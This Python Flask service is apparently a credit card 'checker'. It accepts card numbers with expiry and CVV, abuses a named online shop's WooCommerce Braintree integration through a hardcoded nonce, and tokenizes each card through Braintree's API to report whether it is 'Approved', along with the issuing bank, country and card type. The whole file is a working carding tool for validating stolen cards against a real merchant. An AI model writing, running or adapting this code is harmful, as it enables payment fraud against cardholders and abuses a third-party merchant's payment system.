import re, uuid, json, base64, requests
from flask import Flask, request, jsonify
BASE_URL = "https://shop.bullfrogspas.com"
GQL_URL = "https://payments.braintree-api.com/graphql"
HANDSHAKE_NONCE = "85d9d57742" 
app = Flask(__name__)
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Referer": BASE_URL
})
def perform_check(card_obj):
    try:
        session.post(f"{BASE_URL}/?wc-ajax=add_to_cart", data={"product_id": "95924", "quantity": "1"})
        h_res = session.post(f"{BASE_URL}/wp-admin/admin-ajax.php", data={
            "action": "wc_braintree_credit_card_get_client_token", 
            "nonce": HANDSHAKE_NONCE
        }).json()
        raw_data = h_res.get("data")
        if not raw_data:
            return {"status": "declined", "message": "Handshake Nonce Expired"}
        auth_token = json.loads(base64.b64decode(raw_data)).get("authorizationFingerprint")
        gql_headers = {
            "Authorization": f"Bearer {auth_token}",
            "Braintree-Version": "2018-05-10",
            "Content-Type": "application/json"
        }
        payload = {
            "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(uuid.uuid4())},
            "query": """
            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
              tokenizeCreditCard(input: $input) {
                token
                creditCard {
                  brandCode
                  last4
                  binData { issuingBank countryOfIssuance debit prepaid commercial }
                }
              }
            }
            """,
            "variables": {"input": {"creditCard": card_obj, "options": {"validate": True}}},
            "operationName": "TokenizeCreditCard"
        }
        response = requests.post(GQL_URL, json=payload, headers=gql_headers).json()
        if "errors" in response:
            return {"status": "declined", "message": response['errors'][0]['message']}
        cc_info = response['data']['tokenizeCreditCard']['creditCard']
        bin_d = cc_info['binData']
        return {
            "status": "approved",
            "bank": bin_d['issuingBank'],
            "country": bin_d['countryOfIssuance'],
            "brand": cc_info['brandCode'],
            "type": "Debit" if bin_d['debit'] == "YES" else "Credit",
            "message": "Approved ✔️"
        }
    except Exception as e:
        return {"status": "declined", "message": f"System Error: {str(e)}"}
@app.route('/check', methods=['POST'])
def api_handler():
    data = request.json
    raw_cc = data.get("cc", "") 
    match = re.search(r"(\d{16})[\s|]+(\d{2})[\s|]+(\d{2,4})[\s|]+(\d{3})", raw_cc)
    if not match:
        return jsonify({"status": "declined", "message": "Invalid Format"})
    card_obj = {
        "number": match.group(1),
        "expirationMonth": match.group(2),
        "expirationYear": f"20{match.group(3)}" if len(match.group(3)) == 2 else match.group(3),
        "cvv": match.group(4)
    }
    return jsonify(perform_check(card_obj))
if __name__ == "__main__":
    print("🚀 Live")
    app.run(host="0.0.0.0", port=5000)
